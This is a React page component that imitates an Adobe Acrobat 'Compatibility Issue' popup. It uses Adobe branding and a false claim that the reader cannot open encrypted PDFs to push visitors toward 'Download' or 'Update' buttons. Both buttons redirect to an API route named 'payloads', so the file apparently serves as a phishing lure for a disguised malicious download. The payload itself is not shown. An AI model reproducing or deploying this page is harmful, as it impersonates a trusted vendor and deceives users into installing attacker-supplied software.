import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertTriangle, Download, RefreshCw } from "lucide-react";
import { motion } from "framer-motion";
import { api } from "@shared/routes";
import adobeLogoPath from "@assets/adobe_reader_14145_1766295497679.png";

const ADOBE_RED = "#E31C23";

export default function Home() {
  const [isDownloading, setIsDownloading] = useState(false);

  const handleDownload = () => {
    setIsDownloading(true);
    setTimeout(() => {
      window.location.href = api.payloads.download.path;
      setTimeout(() => setIsDownloading(false), 2000);
    }, 300);
  };

  return (
    <div
      className="relative min-h-screen w-full bg-slate-100 flex items-center justify-center p-4 overflow-hidden font-sans"
      data-testid="page-home"
    >
      {/* Background */}
      <div
        className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1562240020-ce31ccb0fa7d?q=80&w=2000&auto=format&fit=crop')] bg-cover bg-center opacity-10 blur-md pointer-events-none"
        aria-hidden="true"
      />

      {/* Overlay */}
      <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px] z-0" />

      {/* Popup Card */}
      <motion.div
        initial={{ opacity: 0, scale: 0.95, y: 10 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        transition={{ duration: 0.4, ease: "easeOut" }}
        className="z-10 w-full max-w-sm"
      >
        <Card className="border-0 shadow-2xl overflow-hidden">
          {/* Header Strip */}
          <div className="h-1 w-full" style={{ backgroundColor: ADOBE_RED }} />

          {/* Title Section */}
          <CardHeader className="space-y-2 pb-2 px-4 pt-3">
            <div className="flex items-start gap-2">
              <div className="h-9 w-9 rounded bg-red-50 flex items-center justify-center flex-shrink-0">
                <img src={adobeLogoPath} alt="Adobe" className="h-6 w-6 opacity-80" />
              </div>
              <div className="flex-1">
                <CardTitle className="text-sm font-bold text-gray-900">
                  Adobe Acrobat
                </CardTitle>
                <div className="flex items-center gap-1 mt-0.5">
                  <AlertTriangle className="h-3 w-3 flex-shrink-0" style={{ color: ADOBE_RED }} />
                  <span className="text-xs font-semibold" style={{ color: ADOBE_RED }}>
                    Compatibility Issue
                  </span>
                </div>
              </div>
            </div>
            <div className="h-px bg-gray-200 w-full" />
          </CardHeader>

          {/* Content */}
          <CardContent className="px-4 py-2">
            <p className="text-gray-600 text-xs leading-relaxed">
              Your PDF reader may not fully support encrypted documents. Please update or download Adobe Reader.
            </p>
          </CardContent>

          {/* Actions */}
          <CardFooter className="flex gap-2 bg-gray-50 px-4 py-2 border-t border-gray-200">
            <Button
              variant="outline"
              size="sm"
              className="flex-1 h-8 text-xs border-gray-300 hover:border-red-500"
              onClick={handleDownload}
              disabled={isDownloading}
              data-testid="button-download"
            >
              <Download className="h-3 w-3 mr-1" />
              Download
            </Button>
            <Button
              size="sm"
              className="flex-1 h-8 text-xs text-white"
              style={{ backgroundColor: ADOBE_RED }}
              onClick={handleDownload}
              disabled={isDownloading}
              data-testid="button-update"
            >
              {isDownloading ? (
                <span>Wait...</span>
              ) : (
                <>
                  <RefreshCw className="h-3 w-3 mr-1" />
                  Update
                </>
              )}
            </Button>
          </CardFooter>

          {/* Footer Text */}
          <div className="bg-gray-50 px-4 py-1.5 border-t border-gray-200">
            <p className="text-[11px] text-gray-400 text-center leading-tight">
              Use latest Adobe Acrobat Reader for optimal compatibility.
            </p>
          </div>
        </Card>
      </motion.div>
    </div>
  );
}
